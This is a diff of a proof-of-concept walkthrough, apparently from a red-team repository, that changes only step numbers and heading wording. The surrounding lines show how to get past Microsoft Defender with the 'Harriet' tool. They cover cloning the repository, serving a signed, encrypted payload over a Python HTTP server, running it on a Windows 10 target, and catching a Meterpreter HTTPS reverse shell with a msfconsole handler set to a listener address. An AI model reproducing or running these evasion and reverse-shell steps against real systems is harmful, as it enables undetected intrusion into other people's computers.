@@ -20,8 +20,8 @@ Once the payload is compiled, the script uses SigThief to sign the binary with a
 PoC - Example with a stageless Meterpreter (x64) https reverse shell running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
 =========================================================================================================================================================
 
-Step 1 - Download the Harriet tool that is part of the great Github project 'Home-Grown-Red-Team'
-=================================================================================================
+Step 1 - Download the tool 'Harriet' that is part of the great Github project 'Home-Grown-Red-Team'
+====================================================================================================
 
 + Clone The Repo
   > git clone https://github.com/assume-breach/Home-Grown-Red-Team.git
@@ -130,7 +130,7 @@ drwxr-xr-x  8 jeff jeff   4096 Dec 16 17:00 Harriet
 -rwxr-xr-x  1 jeff jeff    191 Dec 16 17:00 setup.sh       
 
 
-Step 3 - Download and execute the signed encrypted payload on a target Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+Step 4 - Download and execute the signed encrypted payload on a target Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
 =======================================================================================================================================
                                                                                 
 jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ python3 -m http.server 8080                                                                                                                                                  
@@ -158,7 +158,7 @@ AntivirusEnabled
 PS C:\Users\Administrator\Downloads> .\HarrietReverseShellTest.exe
 
 
-Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
+Step 5 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop without being detected nor blocked by the MS Defender AV
 ==============================================================================================================================================
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
